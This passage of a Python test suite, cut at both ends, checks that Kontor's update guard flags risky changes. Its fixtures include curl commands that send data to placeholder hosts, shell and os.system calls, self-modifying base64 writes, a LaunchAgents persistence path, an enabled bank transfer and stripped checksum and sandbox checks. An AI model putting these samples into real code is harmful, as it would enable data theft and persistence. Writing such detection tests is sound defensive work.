                ("the check of the bridge taken out", {"bridge.jxa": base["bridge.jxa"].replace(b"  if (!ALLOWED[argv[0]]) throw new Error('no');\n", b"")}, 0, 1),
                ("a script: the program that runs it", {"setup.sh": base["setup.sh"].replace(b"#!/bin/bash", b"#!/tmp/sh")}, 1, 1),
                ("a script: text it writes, though it starts like a comment", {"setup.sh": base["setup.sh"].replace(b"# shown to you", b"# shown")}, 1, 1),
                ("a script: a command more", {"setup.sh": base["setup.sh"] + b"curl -d @x x.example\n"}, 1, 0)):
            with self.subTest(name):
                found = G.compare(base, dict(base, **files))
                self.assertEqual([(f["kind"], f["new"]) for f in found], [("file", False)], name)
                self.assertEqual((found[0]["added"], found[0]["removed"]), (added, removed), name)
        # the same lines in another order: shown, too (a check moved behind what it guards)
        moved = G.compare(base, dict(base, **{"bridge.jxa": base["bridge.jxa"].replace(b"  if (!ALLOWED[argv[0]]) throw new Error('no');\n  return Application('MoneyMoney')[argv[0]]();\n", b"  return Application('MoneyMoney')[argv[0]]();\n  if (!ALLOWED[argv[0]]) throw new Error('no');\n")}))
        self.assertEqual([(f["kind"], f["added"], f["removed"]) for f in moved], [("file", 0, 0)])
        # whether calls to the outside are among the changed lines, and one of them is shown
        out = G.compare(base, dict(base, **{"helper.swift": base["helper.swift"] + b"let x = 3\nlet p = Process()\n"}))[0]
        self.assertEqual((out["added"], out["out"]), (2, 1)); self.assertIn("Process()", out["what"])
        calm = G.compare(base, dict(base, **{"helper.swift": base["helper.swift"] + b"let x = 3\n"}))[0]
        self.assertEqual((calm["added"], calm["out"]), (1, 0))
        new = G.compare(base, dict(base, **{"more.swift": b"import Network\n// c\nlet c = NWConnection(host: \"x.example\", port: 443, using: .tcp)\n"}))
        self.assertEqual([(f["kind"], f["new"], f["added"], f["out"]) for f in new if f["kind"] == "file"], [("file", True, 2, 2)])
        # a comment over several lines still ends the line (in JavaScript it ends the statement before it)
        js = dict(base, **{"bridge.jxa": base["bridge.jxa"].replace(b"  return Application", b"  return /*\n */ Application")})
        self.assertTrue(G.compare(js, dict(js, **{"bridge.jxa": base["bridge.jxa"].replace(b"  return Application", b"  return /* */ Application")})))
        # what cannot be followed to its end keeps its comments: every line counts
        broken = dict(base, **{"helper.swift": base["helper.swift"] + b'let s = "open\n'})
        self.assertTrue(G.compare(broken, dict(broken, **{"helper.swift": broken["helper.swift"].replace(b"// reads the amount", b"// reads it")})))


class NotFound(unittest.TestCase):
    """What an ordinary update changes is not asked about."""

    def setUp(self):
        # as in Kontor: the function that fetches checks the address itself, the one that shows a file starts one fixed program
        self.keep = G.CHECKED
        G.CHECKED = dict(G.CHECKED, **{"fetch.py": ("get",), "tools.py": ("show",)})

    def tearDown(self):
        G.CHECKED = self.keep

    def test_a_function_that_hands_on_is_followed_until_it_is_listed(self):
        use = {"work_py": b"\nimport fetch\n\n\ndef version():\n    return fetch.get('https://api.example.org/v2')\n"}
        self.assertEqual(G.compare(SMALL, changed(**use)), [])
        G.CHECKED = self.keep
        found = G.compare(SMALL, changed(**use))
        self.assertEqual([(f["kind"], f["file"]) for f in found], [("call", "work.py")]); self.assertIn("fetch.get", found[0]["what"])

    def test_ordinary_changes(self):
        for name, files in (
                ("new arithmetic", {"work_py": b"\n\ndef share(a, b):\n    return round(a * b / 100, 2)\n"}),
                ("a new file that computes", {"plan_py": b"import json\nimport math\nfrom datetime import date\n\n\ndef f(x):\n    return json.dumps([math.sqrt(x), date.today().isoformat()])\n"}),
                ("reading and writing files", {"work_py": b"\n\ndef load(path):\n    with open(path) as f:\n        return json.load(f)\n"}),
                ("comments and explanations", {"tools_py": lambda b: b.replace(b"def run(binary, *args):\n", b"def run(binary, *args):\n    \"\"\"Starts a helper.\"\"\"\n    # as before\n")}),
                ("a harmless part of Python more", {"work_py": b"\nimport re\nimport hashlib\nfrom collections import Counter\n"}),
                ("a new page", {"web__app_js": b"\nfunction vNew() { return `<div class=\"card\">${esc(t('new'))}</div>`; }\nconst mark = () => document.createElement('span');\n"}),
                ("requests of the page to Kontor", {"web__app_js": b"\nconst load = () => fetch('/api/new');\n"}),
                ("styles", {"web__app_css": b".b { background:url(/icon.svg); color:blue; }\n"}),
                ("texts and the version", {"docs__help_md": b"More: https://x.example/doc\n", "VERSION": lambda b: b"1.0.1\n", "CHANGELOG_md": b"## 1.0.1\n"}),
                ("a picture", {"docs__img__a.png": b"\x89PNG"}),
                ("a file taken away", {"web__app_css": None}),
                ("a fixed name looked up", {"work_py": b"\n\ndef name(o):\n    return getattr(o, 'name', '')\n"}),
                ("an object's own values", {"work_py": b"\n\nclass A:\n    def copy(self):\n        return dict(self.__dict__)\n"}),
                ("using what fetches as it is meant", {"work_py": b"\nimport fetch\n\n\ndef version():\n    return fetch.get('https://api.example.org/v2')\n"}),
                ("the fixed program started from elsewhere", {"work_py": b"\nimport tools\n\n\ndef where(p):\n    tools.show(p)\n"})):
            with self.subTest(name):
                self.assertEqual(G.compare(SMALL, changed(**files)), [], name)


class Program(unittest.TestCase):
    """Kontor itself, as it is: readable, its lists true, and changes to its own guarded places found."""

    @classmethod
    def setUpClass(cls):
        cls.files = program()
        cls.scan = G.scan(cls.files)

    def found(self, **files):
        new = changed(self.files, **files)
        return G.differences(self.scan[0], G.scan(new), set(new))

    def test_readable_and_the_same_as_itself(self):
        self.assertEqual([k for k in self.scan[0] if k[0] == "unreadable"], [])
        self.assertEqual(G.differences(self.scan[0], self.scan, set(self.files)), [])
        self.assertEqual(sorted(k[1] for k in self.scan[0] if k[0] == "guard"), ["update_guard.py", "updates.py"])

    def test_the_lists_are_true(self):
        """Every rule and every function named in update_guard is there; no function that hands things on has a name any list
        or text has too (it could not be followed -- give it its own name, or check what it is given and list it as CHECKED)."""
        h = G.handing_on(self.files)
        for table in (G.RULES, G.CHECKED):
            for rel, names in table.items():
                for name in names:
                    self.assertIn(name, h["names"].get(rel, []), "%s: %s is named in update_guard but not there" % (rel, name))
        self.assertEqual(h["common"], [])
        self.assertEqual(sorted(k[2] for k in self.scan[0] if k[0] == "rule" and k[1] == "service.py"), sorted(G.RULES["service.py"]))
        # what hands on today: the open starters of programs and what passes a program's place on to them -- a short list
        # (31: llm_local._ask_file hands on only the sandbox level, to ask an installed llama.cpp once about socket files)
        self.assertLessEqual(sum(len(v) for v in h["functions"].values()), 31, h["functions"])
        self.assertIn("run", h["functions"]["tls_cert.py"]); self.assertIn("_git", h["functions"]["updates.py"])

    def test_no_big_function_is_a_guarded_place(self):
        """A function that reaches out is kept as a whole: a large one would be shown with every update. Calls that reach out
        live in small functions of their own (service.py: show_in_finder, open_document ...)."""
        big = []
        for rel, data in self.files.items():
            if not rel.endswith(".py") or rel in G.OWN:
                continue
            import ast
            tree = ast.parse(data.decode("utf-8"))
            sizes = {}
            def walk(node, names):
                for c in ast.iter_child_nodes(node):
                    if isinstance(c, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                        sizes[".".join(names + [c.name])] = c.end_lineno - c.lineno + 1
                        walk(c, names + [c.name])
                    else:
                        walk(c, names)
            walk(tree, [])
            for k in self.scan[0]:
                if k[0] in ("call", "detour") and k[1] == rel and sizes.get(k[2], 0) > 70:
                    big.append("%s: %s (%d lines)" % (rel, k[2], sizes[k[2]]))
        self.assertEqual(big, [])

    def test_changes_to_guarded_places(self):
        for name, files in (
                ("the pages' security rules", {"service_py": lambda b: b.replace(b"connect-src 'self'", b"connect-src *")}),
                ("where Kontor may listen", {"service_py": lambda b: b.replace(b'return ip.is_loopback or ip in ipaddress.ip_network("100.64.0.0/10")', b"return True")}),
                ("what the model is shut out of", {"llm_local_py": lambda b: b.replace(b'"(deny network*)"', b'"(allow network*)"')}),
                ("where downloads may come from", {"llm_local_py": lambda b: b.replace(b'host == "huggingface.co"', b'host != "huggingface.co"')}),
                ("the address Kontor always listens on", {"service_py": lambda b: b.replace(b'_Server(("127.0.0.1", port), handler)', b'_Server(("0.0.0.0", port), handler)')}),
                ("the update's addresses", {"updates_py": lambda b: b.replace(b'"objects.githubusercontent.com")', b'"objects.githubusercontent.com", "x.example")')}),
                ("which documents open", {"service_py": lambda b: b.replace(b'DOCUMENTS = frozenset((".pdf",', b'DOCUMENTS = frozenset((".html", ".pdf",')}),
                ("the command sent to openssl", {"storage_py": lambda b: b.replace(b'r = subprocess.run(["openssl", "enc"] + opts', b'r = subprocess.run(["openssl", "enc", "-x"] + opts')}),
                ("the script for MoneyMoney", {"mm_bridge_py": lambda b: b.replace(b'JXA_FILE = os.path.join(HERE, "mm_bridge.jxa")', b'JXA_FILE = os.path.join(HERE, "docs", "x.md")')}),
                ("MoneyMoney's allowed commands", {"mm_bridge.jxa": b"\nERLAUBT.createBankTransfer = true;\n"}),
                ("the Touch ID helper", {"touchid.swift": b"\nprint(1)\n"}),
                ("the address opened by `kontor open`", {"kontor_py": lambda b: b.replace(b"def ui_url(", b"def ui_url(c):\n    return 'x://' + str(c)\n\n\ndef ui_url_before(")}),
                ("Tailscale's program started with something else, from another part", {"report_py": b"\nimport tls_cert\n\n\ndef send(d):\n    tls_cert.run('/usr/bin/curl', '-d', d, 'x')\n"}),
                ("git used for something else", {"service_py": b"\n\ndef send(u):\n    updates._git('push', u)\n"}),
                ("the model's program started with something else", {"assistant_py": b"\n\ndef send(ai):\n    ai._spawn('/usr/bin/curl', [], 'x', 1, '')\n"}),
                ("the page's download leaving Kontor's own addresses", {"web__app_js": lambda b: b.replace(b"if (!/^\\/(?!\\/)/.test(String(url))) return; ", b"")}),
                ("the restart leading to another place", {"web__app_js": lambda b: b.replace(b"if (new URL(target).hostname === location.hostname) location.href = target;", b"location.href = target;")}),
                ("the update check replaced while Kontor runs", {"report_py": b"\nimport updates\n\n\ndef send():\n    updates.review = lambda new: {'digest': '', 'findings': []}\n"})):
            with self.subTest(name):
                self.assertTrue(self.found(**files), name)

    def test_changes_to_the_internet_search(self):
        """The rules of the assistant's internet search make no call of their own that reaches out -- a later version could
        widen them unseen. Each is named in RULES: softened, it is shown as a changed rule."""
        def swap(old, new):
            def change(b):
                self.assertEqual(b.count(old), 1, old)             # (the place is there, once: the change is really made)
                return b.replace(old, new)
            return change
        cases = (
            # the reader: which hosts, redirects, no address of this Mac or the local network
            ("any host", "web_reader.py", swap(b'    if host not in {str(h).lower() for h in hosts or ()}:\n        raise Refused("host")\n', b"")),
            ("no https", "web_reader.py", swap(b'    if u.scheme != "https":\n        raise Refused("scheme")\n', b"")),
            ("a redirect to any host", "web_reader.py", swap(b"        self.check(host_ok(newurl, self.hosts))", b"        self.check(urlparse(newurl).hostname)")),
            ("private addresses", "web_reader.py", swap(b'        if not global_address(ip):\n            raise Refused("private")\n', b"")),
            ("what counts as a public address", "web_reader.py", swap(b"    return all(x.is_global and not x.is_multicast for x in inner_addresses(ip))", b"    return True")),
            ("an IPv4 address inside an IPv6 one", "web_reader.py", swap(b"    if int(ip) >> 32 == 0 or ip in NAT64:", b"    if False:")),
            ("the translator's addresses", "web_reader.py", swap(b'NAT64 = ipaddress.ip_network("64:ff9b::/96")', b'NAT64 = ipaddress.ip_network("64:ff9b::/128")')),
            # the filter against the user's own data
            ("the filter never refuses", "web_search.py", swap(b'    raw = unicodedata.normalize("NFC", str(text or ""))\n    forms = [raw]\n', b'    return ""\n')),
            ("no IBAN found", "web_search.py", swap(b'            return "it contains an IBAN"\n', b"            pass\n")),
            ("no name compared", "web_search.py", swap(b"                if run in phrases and len(run) >= least:\n", b"                if False:\n")),
            ("names read only as written", "web_search.py", swap(b"    add(_fold(raw[::-1]).split(), _PLAIN_LEAST)\n", b"")),
            ("digits for letters not read", "web_search.py", swap(b'_LEET = (str.maketrans("0134578", "oieastb"), ', b'_LEET = (str.maketrans("", ""), ')),
            ("any writing goes", "web_search.py", swap(b'        if " " <= c <= "~" or c in _LETTERS or c in _SIGNS:\n', b"        if True:\n")),
            ("more letters go", "web_search.py", swap(b"range(0xC0, 0x17F)", b"range(0xC0, 0x250)")),
            ("names folded another way", "web_search.py", swap(b'    t = " ".join(re.findall(r"[a-z0-9]+", t))', b'    t = " ".join(re.findall(r"[a-z]+", t))')),
            ("names cut another way", "web_search.py", swap(b'if t not in LEGAL and not re.fullmatch(r"\\d{5}", t)]\n\n', b"if len(t) > 9]\n\n")),
            ("an index without amounts", "web_search.py", swap(b"            amounts.add(int(round(abs(v) * 100)))", b"            pass")),
            ("a number read another way", "web_search.py", swap(b'    m = re.fullmatch(r"(.*\\d)[.,](\\d{1,2})", piece, re.S)', b"    m = None")),
            ("one more word that names nothing", "web_search.py", swap(b'GENERIC = {"bank", ', b'GENERIC = {"mustermann", "bank", ')),
            ("one more legal form", "web_search.py", swap(b'LEGAL = {"gbr", ', b'LEGAL = {"mustermann", "gbr", ')),
            ("digits found another way", "web_search.py", swap(b'_CHAIN = re.compile(r"\\d(?:[\\W_\\d]*\\d)?")', b'_CHAIN = re.compile(r"\\d{99}")')),
            ("figures left out of the index", "web_search.py", swap(b'_NO_FIGURES = frozenset(("accounts_activity", ', b'_NO_FIGURES = frozenset(("areas", "accounts_activity", ')),
            # what each source is asked, and where
            ("a source's hosts", "web_search.py", swap(b'"wikidata": {"tier": 1, "hosts": ("www.wikidata.org",)}', b'"wikidata": {"tier": 1, "hosts": ("www.wikidata.org", "x.example")}')),
            ("the hosts handed to the reader", "web_search.py", swap(b'    hosts = list(p.get("hosts") or SOURCES[p["source"]]["hosts"])', b'    hosts = [urlparse(url).hostname]')),
            ("the hosts a result is linked on", "web_search.py", swap(b'"gleif": ("search.gleif.org",)', b'"gleif": ("search.gleif.org", "x.example")')),
            ("a feed", "web_search.py", swap(b'"ecb": "https://www.ecb.europa.eu/rss/press.xml"', b'"ecb": "https://www.ecb.europa.eu/rss/other.xml"')),
            ("a request not checked", "web_search.py", swap(b"        p.update(query=q, check=q)\n", b'        p.update(query=q, check="")\n')),
            ("a page on a host that is none", "web_search.py", swap(b'        if u.scheme != "https" or not host or u.username or u.password or "." not in host:\n', b"        if False:\n")),
            ("signs nobody sees in a query", "web_search.py", swap(b' or _INVISIBLE.search(q):', b' and _INVISIBLE.search(q):')),
            ("a day in from", "web_search.py", swap(b'r"(19|20)\\d\\d(-(0[1-9]|1[0-2]))?", s):', b'r"(19|20)\\d\\d(-\\d\\d){0,2}", s):')),
            ("a name for Kontor in every request", "web_search.py", swap(b'NEUTRAL_AGENT = "Mozilla/5.0 (compatible)"', b'NEUTRAL_AGENT = "Kontor"')),
            # which websites count as the user's, what the reader process is shut out of
            ("any website trusted", "web_search.py", swap(b'    return bool(h) and any(h == x or h.endswith("." + x) for x in sites)', b"    return True")),
            ("a shared domain as one website", "web_search.py", swap(b'SHARED = {"github.io", ', b'SHARED = {')),
            ("the reader's sandbox", "web_search.py", swap(b'"(version 1)", "(allow default)", "(deny network*)",', b'"(version 1)", "(allow default)",')),
            ("the reader without its sandbox", "web_search.py", swap(b'        if sys.platform == "darwin" and level != "off":\n', b"        if False:\n")),
            ("another program as the reader", "web_search.py", swap(b'READER = os.path.join(HERE, "web_reader.py")', b'READER = os.path.join(HERE, "docs", "reader.py")')),
            # a question to Claude: asked every time, its text as the card shows it, one address, the key beside it
            ("Claude without asking", "web_search.py", swap(b'ASKED_ALWAYS = frozenset(("claude",))', b"ASKED_ALWAYS = frozenset(())")),
            ("Claude trusted like any source", "web_search.py", swap(b'    return {"sources": [x for x in SOURCES if x not in ASKED_ALWAYS], "hosts": []}', b'    return {"sources": list(SOURCES), "hosts": []}')),
            ("a page Claude named read without asking", "web_search.py", swap(b'ANYWHERE = frozenset(("gdelt", "tavily", "claude"))', b'ANYWHERE = frozenset(("gdelt", "tavily"))')),
            ("Claude's address", "web_search.py", swap(b'CLAUDE_URL = "https://api.anthropic.com/v1/messages"', b'CLAUDE_URL = "https://api.anthropic.com/v1/complete"')),
            ("a longer question to Claude", "web_search.py", swap(b"CLAUDE_QUESTION = 1000 ", b"CLAUDE_QUESTION = 100000 ")),
            ("another frame around the question", "web_search.py", swap(b'CLAUDE_SYSTEM = ("Research question from a personal finance program; today is %s. ', b'CLAUDE_SYSTEM = ("Research question; today is %s. ')),
            ("more than the question in the request", "web_search.py", swap(b'            "messages": [{"role": "user", "content": question}],\n', b'            "messages": [{"role": "user", "content": question}], "metadata": {"user_id": model},\n')),
            ("a question to Claude not checked", "web_search.py", swap(b"        p.update(query=q, check=q, url=CLAUDE_URL, ", b'        p.update(query=q, check="", url=CLAUDE_URL, ')),
            ("more handed to the reader beside the key", "web_search.py", swap(b"body=p[\"body\"], key=key, timeout=CLAUDE_SECONDS", b"body=p[\"body\"], key=key, headers={\"Accept-Language\": key}, timeout=CLAUDE_SECONDS")),
            ("any model to choose", "web_search.py", swap(b'CLAUDE_MODELS = {"claude-opus-5-5": "Claude Opus 5.5", ', b'CLAUDE_MODELS = {"other": "Other", "claude-opus-5-5": "Claude Opus 5.5", ')),
            # in the assistant
            ("changes after web text", "assistant.py", swap(b'        if job.conv is not None and job.conv.get("web"):', b'        if job.conv is not None and job.conv.get("no"):')),
            ("everything trusted", "assistant.py", swap(b'        return p["source"] in tw["sources"]', b"        return True")),
            ("Claude trusted when the settings say so", "assistant.py", swap(b' and p["source"] not in web_search.ASKED_ALWAYS\n', b"\n")),
            ("no index: search anyway", "assistant.py", swap(b'        idx = web_search.own_index(*got()) if got else {"empty": True}', b'        idx = web_search.own_index(*got()) if got else {"empty": False}')))
        # a rule is kept per file: each change is looked for in its file alone (quick) -- three of them in the whole program too
        before = {rel: G.scan({rel: self.files[rel]})[0] for rel in ("web_reader.py", "web_search.py", "assistant.py")}

        def found(rel, change):
            new = {rel: change(self.files[rel])}
            return G.differences(before[rel], G.scan(new), set(new))
        for rel in before:
            self.assertEqual(found(rel, lambda b: b), [], rel)     # as it is, against itself: nothing
        for name, rel, change in cases:
            with self.subTest(name):
                self.assertIn(("rule", rel), [(f["kind"], f["file"]) for f in found(rel, change)], name)
        for name in ("any host", "the filter never refuses", "changes after web text"):
            rel, change = next(c[1:] for c in cases if c[0] == name)
            with self.subTest("in the whole program: " + name):
                whole = self.found(**{rel.replace(".py", "_py"): change})
                self.assertIn(("rule", rel), [(f["kind"], f["file"]) for f in whole], name)
                self.assertTrue(all(f["file"] == rel for f in whole), whole)
        gone = found("web_reader.py", swap(b"def host_ok(", b"def host_fine("))
        self.assertIn(("rule", "web_reader.py", "host_ok()", True), [(f["kind"], f["file"], f["what"], f.get("gone", False)) for f in gone])
        gone = found("web_search.py", swap(b"\nSOURCES: Dict[str, dict] = {", b"\nPLACES: Dict[str, dict] = {"))
        self.assertIn(("rule", "web_search.py", "SOURCES", True), [(f["kind"], f["file"], f["what"], f.get("gone", False)) for f in gone])
        # the reader's one request to Claude reaches out itself: softened, it is found as a call that goes out (not as a rule)
        for name, change in (("the key to another address", swap(b'CLAUDE = "https://api.anthropic.com/v1/messages"', b'CLAUDE = "https://api.example.org/v1/messages"')),
                             ("any address with the key", swap(b"    if req.get(\"url\") != CLAUDE or not isinstance(key, str)", b"    if not isinstance(key, str)")),
                             ("any key", swap(b" or not CLAUDE_KEY.fullmatch(key)", b"")),
                             ("the request's own headers to Claude", swap(b'"headers": {"Content-Type": "application/json"}}\n', b'"headers": req.get("headers")}\n')),
                             ("more of the answer handed back", swap(b'    res["data"] = claude_answer(res["data"])\n', b"")),
                             ("Claude over the general way", swap(b" or (host == urlparse(CLAUDE).hostname and own is None)", b"")),
                             ("the general way's headers after the reader's own", swap(b"    headers.update(own or {})\n", b"    headers = dict(own or {}, **headers)\n"))):
            with self.subTest(name):
                got = found("web_reader.py", change)
                self.assertTrue([f for f in got if f["kind"] in ("call", "around", "address")], name)
        self.assertIn("ask_claude", G.CHECKED["web_reader.py"])                 # it looks itself at what it is handed: its callers are not followed
        # how results are shaped for the model, a label, an explanation, a new helper: an ordinary change
        for name, rel, change in (("a shorter summary", "web_search.py", swap(b"SNIPPET = 360", b"SNIPPET = 300")),
                                  ("a source's label", "web_search.py", swap(b'"gleif": "GLEIF"', b'"gleif": "GLEIF (LEI)"')),
                                  ("a new helper", "web_search.py", lambda b: b + b"\n\ndef _shorter(s):\n    return str(s)[:80]\n"),
                                  ("how much of Claude's answer the model gets", "web_search.py", swap(b"CLAUDE_TEXT = 6000 ", b"CLAUDE_TEXT = 5000 ")),
                                  ("the day's limit from the factory", "web_search.py", swap(b"CLAUDE_PER_DAY = 20 ", b"CLAUDE_PER_DAY = 10 ")),
                                  ("an explanation", "web_reader.py", swap(b'    """The host of url if it may be fetched: ', b'    """The host of an address if it may be fetched: '))):
            with self.subTest(name):
                self.assertEqual(found(rel, change), [], name)

    def test_what_a_rule_of_the_internet_search_goes_by_is_a_rule_too(self):
        """A rule of the internet search reads fixed lists and patterns of its file and calls small functions of it: each of
        them is named in RULES as well -- a change there changes what the rule lets through."""
        import ast
        for rel in ("web_search.py", "web_reader.py"):
            tree = ast.parse(self.files[rel].decode("utf-8"))
            tops = {}
            for st in tree.body:
                for t in (st.targets if isinstance(st, ast.Assign) else [st.target] if isinstance(st, ast.AnnAssign) else []):
                    tops.update({x.id: st for x in ast.walk(t) if isinstance(x, ast.Name)})
            funcs = {n.name: n for n in tree.body if isinstance(n, ast.FunctionDef)}
            funcs.update({n.name: n for c in tree.body if isinstance(c, ast.ClassDef) for n in c.body if isinstance(n, ast.FunctionDef) and n.name not in funcs})
            listed = set(G.RULES[rel])
            for name in sorted(listed):
                node = funcs.get(name) or tops[name]
                names = [x for x in ast.walk(node) if isinstance(x, ast.Name)]
                own = {x.id for x in names if isinstance(x.ctx, ast.Store)} | {a.arg for x in ast.walk(node) if isinstance(x, ast.arguments) for a in x.args + x.kwonlyargs} \
                    if name in funcs else set()            # (what the function names itself: its values, what it is given)
                used = {x.id for x in names if isinstance(x.ctx, ast.Load)} - own
                self.assertEqual({u for u in used if (u in tops or u in funcs) and u not in listed} - {"log"}, set(), "%s: %s" % (rel, name))
        rules = sorted((k[1], k[2]) for k in self.scan[0] if k[0] == "rule" and k[1] in ("web_search.py", "web_reader.py", "assistant.py"))
        self.assertEqual(rules, sorted((rel, name) for rel in ("web_search.py", "web_reader.py", "assistant.py") for name in G.RULES[rel]))

    def test_reviewed_before_3_17(self):
        """What an independent review before 3.17 found open on Kontor itself -- each a change without a finding before. (Several
        changes at different places share one reading of the program; each is told by its own finding: kind, file, what.)"""
        def check(files, expected):
            new = changed(self.files, **{k: v for k, v in files.items() if "/" not in k})
            new.update({k: v for k, v in files.items() if "/" in k})
            found = G.differences(self.scan[0], G.scan(new, set(self.files)), set(new))
            for name, (kinds_, rel, what) in expected.items():
                with self.subTest(name):
                    self.assertTrue([f for f in found if f["kind"] in kinds_ and f["file"] == rel and what in f["what"]], (name, found))
        code, own = ("call", "detour", "module"), ("rule", "detour", "call")
        # Python reached through Kontor's own parts; writing into its own files; names put together; more ways to start programs;
        # the check replaced by a folder of the same name; pages by other names
        check({"x_storage_py": b"import storage\n\n\ndef send(a):\n    storage.subprocess.Popen(['/bin/sh', '-c', a])\n",
               "x_llm_py": b"import llm_local\n\n\ndef send(u, d):\n    llm_local.urllib.request.urlopen(u, d)\n",
               "x_core_py": b"import core\n\n\ndef send(a):\n    core.os.system(a)\n",
               "x_from_py": b"from storage import subprocess as sp\n",
               "x_grow_py": b"import base64\nimport os\n\n\ndef grow(t):\n    with open(os.path.join(os.path.dirname(__file__), 'stor' + 'age.py'), 'a') as f:\n        f.write(base64.b64decode(t).decode())\n",
               "x_start_py": b"import os\n\n\ndef send(home):\n    return os.path.join(home, 'Library', 'Launch' + 'Agents', 'x.plist')\n",
               "x_exec_py": b"import os\n\n\ndef send(d):\n    os._execvpe(d, [d], {})\n",
               "x_spawn_py": b"import os\n\n\ndef send(d):\n    os._spawnvef(0, d, [d], None, os.execv)\n",
               "x_insides_py": b"\n\ndef send():\n    return type.__dict__['__sub' + 'classes__'](object)\n",
               "update_guard/__init__.py": b"def compare(a, b):\n    return []\n",
               "web/x_link.js": b"function send(u) { const d = document.createElement('div'); d.innerHTML = '<a hr' + 'ef=\"' + u + '\">x</a>'; d.firstChild['click'](); }\n",
               "web/x_location.js": b"const L = location;\nfunction send(u) { L.assign(u); }\n",
               "web/x_install.js": b"async function later() { await api('/api/update/install', {approved: ((S.STATUS.update || {}).review || {}).digest}); }\n"},
              {"a program through storage": (code, "x_storage.py", "subprocess"), "a request through llm_local": (code, "x_llm.py", "urllib"),
               "os.system through core": (code, "x_core.py", "os.system"), "taken from storage by name": (code, "x_from.py", "subprocess"),
               "writing into a program file": (("self",), "x_grow.py", "grow"), "a start entry from pieces": (("place",), "x_start.py", "'Launch' + 'Agents'"),
               "os._execvpe": (code, "x_exec.py", "_execvpe"), "os._spawnvef": (code, "x_spawn.py", "_spawnvef"),
               "the insides of Python by a name from pieces": (("detour",), "x_insides.py", "send"),
               "a folder instead of the check": (("shadow",), "update_guard/", "update_guard"),
               "a link from pieces, clicked by a name as text": (("page",), "web/x_link.js", "click"),
               "location under another name": (("page",), "web/x_location.js", "location"),
               "the page installs from elsewhere": (("page",), "web/x_install.js", "/api/update/install")})
        # the approval and "only at the Mac"; where updates and the assistant's downloads come from, and that they are checked
        asks = b'approved=str(body.get("approved") or ""))\n            if res.get("needs_approval"):\n                res = updates.install("stecrz/Kontor", approved=res["review"]["digest"])\n'
        check({"service_py": lambda b: b.replace(b'approved=str(body.get("approved") or ""))\n', asks, 1),
               "web__app_js": lambda b: b.replace(b"finds.length ? {approved: rev.digest} : {}", b"{approved: rev.digest}"),
               "auth_py": lambda b: b.replace(b'return remote in ("127.0.0.1", "::1", "localhost")', b"return True"),
               "core_py": lambda b: b.replace(b'"updates": {"repo": "stecrz/Kontor"', b'"updates": {"repo": "x/Kontor"'),
               "llm_local_py": lambda b: b.replace(b'RUNTIME_REPO = "ggml-org/llama.cpp"', b'RUNTIME_REPO = "x/llama.cpp"')},
              {"the install asks itself for the approval": (own, "service.py", "_update_install"), "the page approves by itself": (("rule",), "web/app.js", "upInstall"),
               "at the Mac: any address": (("rule",), "auth.py", "is_loopback"), "updates from another repository by default": (("address",), "core.py", "x/Kontor"),
               "llama.cpp from another repository": (("rule", "address"), "llm_local.py", "x/llama.cpp")})
        check({"service_py": lambda b: b.replace(b"return self._update_install(body, s)", b"return self._update_install(dict(body, approved=((app.update_info or {}).get('review') or {}).get('digest')), s)"),
               "web__app_js": lambda b: b.replace(b"if (!f.length && !plain.length) return '';", b"return '';"),
               "llm_local_py": lambda b: b.replace(b'"repo": "unsloth/Qwen3.5-9B-GGUF"', b'"repo": "x/Qwen3.5-9B-GGUF"')},
              {"the approval made up on the way": (own, "service.py", "_route"), "the findings no longer shown": (("rule",), "web/app.js", "upReview"),
               "a model from another repository": (("address",), "llm_local.py", "x/Qwen3.5-9B-GGUF")})
        check({"service_py": lambda b: b.replace(b'return auth.is_loopback(s.get("remote", "")) and self._loopback()', b"return True"),
               "web__app_js": lambda b: b.replace(b"guard: ['upd_t_check', 'upd_w_check'], ", b""),
               "llm_local_py": lambda b: b.replace(b'        if not SHA_RE.fullmatch(sha256 or ""):             # nothing is installed or run that cannot be checked\n            raise ValueError(tr("s_ki_keine_pruefsumme"))\n', b"")},
              {"at the Mac: the service's own check": (("rule",), "service.py", "_is_local"), "a kind of finding hidden": (("rule",), "web/app.js", "UP_KINDS"),
               "loaded without a SHA-256": (("rule",), "llm_local.py", "_fetch")})
        check({"service_py": lambda b: b.replace(b'            if not self._is_local(s):\n                return self._json(403, {"error": tr("s_updates_nur_von_diesem_mac")})\n', b""),
               "web__app_js": lambda b: b.replace(b"if (finds.length && !confirm(t('upd_frage', S.STATUS.update.available))) return;", b""),
               "llm_local_py": lambda b: b.replace(b"if (total and size != total) or got != sha256:", b"if False:"),
               "mm_bridge.jxa": b"\nERLAUBT.createBankTransfer = true;\n"},
              {"updates from other devices": (("rule",), "service.py", "_update_install"), "the page asks no more": (("rule",), "web/app.js", "upInstall"),
               "the SHA-256 not compared": (("rule",), "llm_local.py", "_fetch"), "MoneyMoney's bridge: a line of code": (("file",), "mm_bridge.jxa", "createBankTransfer")})
        check({"service_py": lambda b: b.replace(b'"stecrz/Kontor"', b'"stecrz/Kontor2"')}, {"updates from another repository": (("address",), "service.py", "stecrz/Kontor2")})
        check({"service_py": lambda b: b.replace(b'or "stecrz/Kontor", restart=True', b'or "x/Kontor", restart=True')},
              {"... only where it installs": (("address",), "service.py", "x/Kontor")})
        # a new model in a repository named already, another variant of one, comments of the helpers: nothing to ask about
        self.assertEqual(self.found(llm_local_py=lambda b: b.replace(b'    {"id": "qwen3.5-9b",', b'    {"id": "qwen3.5-9b-q8", "name": "Qwen3.5 9B Q8", "repo": "unsloth/Qwen3.5-9B-GGUF", "pick": ["Q8_0"], "gb": 10, "ram": 24, "note": "small"},\n    {"id": "qwen3.5-9b",', 1)
                                    .replace(b'"pick": ["Q4_K_M", "UD-Q4_K_XL"], "gb": 6', b'"pick": ["UD-Q4_K_XL", "Q4_K_M"], "gb": 6', 1),
                                    **{"mm_bridge.jxa": lambda b: b + b"\n// nothing else\n", "mac_app_swift": lambda b: b.replace(b"// mac_app.swift --", b"// mac_app.swift (the app) --", 1)}), [])

    def judged(self, **files):
        """Kontor's program changed (name__sub or a path with "/"), judged against itself as it is: what compare gives."""
        new = changed(self.files, **{k: v for k, v in files.items() if "/" not in k})
        new.update({k: (v(self.files.get(k, b"")) if callable(v) else v) for k, v in files.items() if "/" in k})
        scanned = G.scan(new, set(self.files))
        return G.judge(G._differences(self.scan[0], scanned, set(new)), self.files, new, self.scan, scanned)

    def test_a_major_version_asks_only_what_can_be_a_risk(self):
        """Like the update 3.16.100 -> 3.17.0 (made up on Kontor as it is; the real one: ReleasedVersions): stricter filters and
